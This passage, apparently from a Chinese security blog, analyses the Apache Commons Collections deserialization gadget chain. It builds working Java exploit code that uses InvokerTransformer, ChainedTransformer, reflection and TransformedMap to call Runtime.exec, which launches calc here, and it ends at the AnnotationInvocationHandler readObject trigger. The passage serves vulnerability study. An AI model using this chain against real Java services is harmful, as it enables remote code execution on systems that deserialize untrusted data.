class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//构造传入transform的参数，为Runtime实例，</span></span><br><span class="line">        Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        FileInputStream fi=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin=<span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        InvokerTransformer b=(InvokerTransformer) fin.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞，调用transform，input为传入参数</span></span><br><span class="line">        b.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608bc03604caa.jpg"></p>
<p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p>
<p>这里可以控制传入<code>transform</code>的参数，因为<code>object</code>的来源是上一次<code>this.ITransformers[i].transform</code>的返回值，而且因为<code>iTransformers</code>可控，我们可以调用任意一个类的<code>transform</code>方法</p>
<p><img src="https://www.hualigs.cn/image/608bc02f6f7cb.jpg"></p>
<p><code>org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer</code></p>
<p>这里我们可以控制<code>this.iContant</code>，它会等于下一次执行的传入参数<code>object</code>。表面上看让它等于<code>Runtime实例</code>就解决了之前无法传入<code>Runtime</code>实例的问题，但是实际上并不可行，因为Runtime类不能被反序列化</p>
<p><img src="https://www.hualigs.cn/image/608bc0300ee48.jpg"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造Transformers数组</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用ChainedTransformer封装构造好的Transformers数组，也就是让构造好的数组等于this.iTransformers</span></span><br><span class="line">        Transformer transformerChain=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        FileOutputStream f=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout=<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行失败</p>
<p><img src="https://www.hualigs.cn/image/608bc036059cd.jpg"></p>
<p>换一种思路，有没有可能利用反射直接在服务器生成一个Runtime实例？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformers</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>依然报错，原因是前面提到的反射机制，<code>Runtime.class</code>返回<code>java.lang.class</code>，这里我们必须把<code>Runtime.class</code>换成<code>Runtime实例.class</code>才能按预想中的执行，但是我们现在就在想办法得到<code>Runtime实例</code>，这样就变成一个死循环了。这个方法也不行</p>
<p><img src="https://www.hualigs.cn/image/608bc0318b74b.jpg"></p>
<h2 id="反射套娃"><a href="#反射套娃" class="headerlink" title="反射套娃"></a>反射套娃</h2><p><code>getRuntime</code>方法会返回<code>Runtime实例</code>，只要获取到了<code>getRuntime</code>方法再<code>invoke</code>执行就等于获取到了<code>Runtime实例</code>。既然无法直接获取Runtime实例，那可以去尝试获取getRuntime方法。</p>
<p><strong>注意：开始传入的是java.lang.class类（Runtime.class）</strong></p>
<p>步骤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</span><br><span class="line"></span><br><span class="line">2. 通过getMethod函数获取Runtime类中的getRuntime函数。在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</span><br><span class="line"></span><br><span class="line">3. 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</span><br><span class="line"></span><br><span class="line">4. invoke调用getRuntime函数，获取Runtime类的实例。里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</span><br></pre></td></tr></table></figure>



<p>关于反射</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">类.getMethod(要获取的方法名,要获取方法的参数类型) 获得方法对象</span><br><span class="line">方法对象.invoke(相关类实例&#x2F;相关类,参数)  执行方法</span><br><span class="line"></span><br><span class="line">invoke的第一个参数是执行method的对象obj：</span><br><span class="line">        如果这个方法是一个普通方法，那么第一个参数是类对象</span><br><span class="line">        如果这个方法是一个静态方法，那么第一个参数是类</span><br></pre></td></tr></table></figure>



<p>接下来分析一下利用反射机制进行反射调用的过程</p>
<p>第一次循环直接返回了<code>Runtime.class</code></p>
<p><img src="https://www.hualigs.cn/image/608bc0300ee48.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input1&#x3D;Runtime.class</span><br></pre></td></tr></table></figure>



<p>第二次</p>
<p>实际执行的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二次循环</span></span><br><span class="line">       Class cls2=input1.getClass(); <span class="comment">//cls2:java.lang.class类</span></span><br><span class="line">       Method method2=cls2.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);<span class="comment">//method2:通过反射获取到的getMethod对象</span></span><br><span class="line">       Object input2=method2.invoke(input1,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125; &#125;);<span class="comment">//input2:getRuntime对象</span></span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608bc0325cf05.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608bc03229eb1.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608bc03234de2.jpg"></p>
<p>第三次循环，最重要的一步，先用反射获取<code>invoke方法对象</code>，然后利用<code>invoke方法对象.invoke</code>执行传入<code>getRuntime</code>方法对象，得到<code>Runtime</code>实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三次循环，input是通过反射获取到的getRuntime对象</span></span><br><span class="line">        Class cls3=input2.getClass();<span class="comment">//java.lang.reflec.Method类</span></span><br><span class="line">        Method method3=cls3.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;);<span class="comment">//method3:invoke方法对象.第二个参数为invoke的参数类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)</span></span><br><span class="line">        Object input3=method3.invoke(input2,<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125; &#125;); <span class="comment">//input3:Runtime实例</span></span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608bc03237b59.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608bc03102586.jpg"></p>
<p>第四次循环</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第四次循环，已经获取到了Runtime实例</span></span><br><span class="line">       Class cls4=input3.getClass(); <span class="comment">//cls4:java.lang.Runtime类</span></span><br><span class="line">       Method method4=cls4.getMethod(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123;String.class &#125;);<span class="comment">//method4:exec方法对象</span></span><br><span class="line">       method4.invoke(input3,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);<span class="comment">//exec方法对象.invoke(Runtime实例,参数)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608bc02f6f7cb.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608bc0326de94.jpg"></p>
<p>简化流程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次循环,返回了Runtie.class</span></span><br><span class="line">        Class input1=Runtime.class;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第二次循环</span></span><br><span class="line">        Class cls2=input1.getClass(); <span class="comment">//cls2:java.lang.class类</span></span><br><span class="line">        Method method2=cls2.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);<span class="comment">//method2:通过反射获取到的getMethod对象</span></span><br><span class="line">        Object input2=method2.invoke(input1,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125; &#125;);<span class="comment">//input2:getRuntime对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//第三次循环，input是通过反射获取到的getRuntime对象</span></span><br><span class="line">        Class cls3=input2.getClass();<span class="comment">//java.lang.reflec.Method类</span></span><br><span class="line">        Method method3=cls3.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;);<span class="comment">//method3:invoke方法对象.第二个参数为invoke的参数类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)</span></span><br><span class="line">        Object input3=method3.invoke(input2,<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125; &#125;); <span class="comment">//input3:Runtime实例</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//第四次循环，已经获取到了Runtime实例</span></span><br><span class="line">        Class cls4=input3.getClass(); <span class="comment">//cls4:java.lang.Runtime类</span></span><br><span class="line">        Method method4=cls4.getMethod(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123;String.class &#125;);<span class="comment">//method4:exec方法对象</span></span><br><span class="line">        method4.invoke(input3,<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);<span class="comment">//exec方法对象.invoke(Runtime实例,参数)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="反序列化触发点"><a href="#反序列化触发点" class="headerlink" title="反序列化触发点"></a>反序列化触发点</h1><p>到目前为止我们已经构造好了反射利用链，现在来看一下如何触发，触发需要两个条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.服务器调用readObject反序列化构造好的ChainedChainedTransformer</span><br><span class="line">2.调用反序列化后的ChainedTransformer类中的transform方法执行命令</span><br></pre></td></tr></table></figure>

<p>代码如下，实际环境中基本不可能满足这两个条件，因此我们需要寻找其他触发方式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把构造好的数组封装成ChainedTransformer</span></span><br><span class="line">        ChainedChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化数据</span></span><br><span class="line">        FileOutputStream fileOutputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化数据</span></span><br><span class="line">        FileInputStream fileInputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用反序列化后的ChainedTransformer类中的transform方法触发</span></span><br><span class="line">        ChainedTransformer SerialChainTransformer=(ChainedTransformer)objectInputStream.readObject();</span><br><span class="line">        SerialChainTransformer.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="绑定Map和转换链"><a href="#绑定Map和转换链" class="headerlink" title="绑定Map和转换链"></a>绑定Map和转换链</h2><p>之前我们把构造好的Transformer数组封装成了一个ChainedTransformer，它实质上是一个转换链，而TransformerMap类的构造函数可以绑定map和转换链，只要在map中添加数据就会自动调用这个转换链，执行payload，这样降低了触发的难度</p>
<p><code>org.apache.commons.collections.map.TransformedMap</code></p>
<p>TransformedMap类的功能是存储键值对并将其转换为transform objects，<code>decorate</code>方法可创建键值对组，用于绑定map和转换链</p>
<p><img src="https://www.hualigs.cn/image/608bc03242581.jpg"></p>
<p>代码实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把构造好的数组封装成ChainedTransformer</span></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map map=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化map</span></span><br><span class="line">        FileOutputStream fileOutputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(map);</span><br><span class="line"></span><br><span class="line">        FileInputStream fileInputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Map UnserializedMap=(Map)objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//只要修改Map的值就会触发转换链，执行payload</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//向Map中添加新值</span></span><br><span class="line">        <span class="comment">//UnserializedMap.put(&quot;123&quot;,&quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//修改键值</span></span><br><span class="line">        Map.Entry entry  = (Map.Entry) UnserializedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>现在触发条件变成了经过迭代器迭代调用<code>setValue</code>函数修改<code>Map</code>值来触发漏洞，继续寻找调用了<code>setValue</code>的地方</p>
<h2 id="AnnotationInvocationHandler的readObject复写点"><a href="#AnnotationInvocationHandler的readObject复写点" class="headerlink" title="AnnotationInvocationHandler的readObject复写点"></a>AnnotationInvocationHandler的readObject复写点</h2><p>jdk1.7中有一个存在readobject复写点的类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。java在反序列化中会优先调用复写的readObject</p>
<p><code>AnnotationInvocationHandler</code>构造函数</p>
<p><img src="https://www.hualigs.cn/image/608bc03252278.jpg"></p>
<p>存在<code>setValue</code>，触发漏洞</p>
